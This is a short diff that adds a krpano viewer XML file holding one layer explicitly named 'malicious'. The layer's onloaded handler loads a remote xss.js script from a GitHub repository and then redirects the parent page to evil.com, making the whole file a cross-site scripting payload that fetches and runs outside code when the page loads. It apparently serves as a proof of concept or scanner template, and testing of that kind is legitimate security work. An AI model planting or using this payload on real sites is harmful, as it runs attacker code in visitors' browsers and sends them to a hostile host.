@@ -1,0 +1,6 @@
+<krpano>
+    <layer name="malicious" 
+           type="container" 
+           visible="true" 
+           onloaded="loadjs('https://raw.githubusercontent.com/schooldropout1337/nuclei-templates/refs/heads/main/xss.js');openurl('https://evil.com', _parent);"/>
+</krpano>
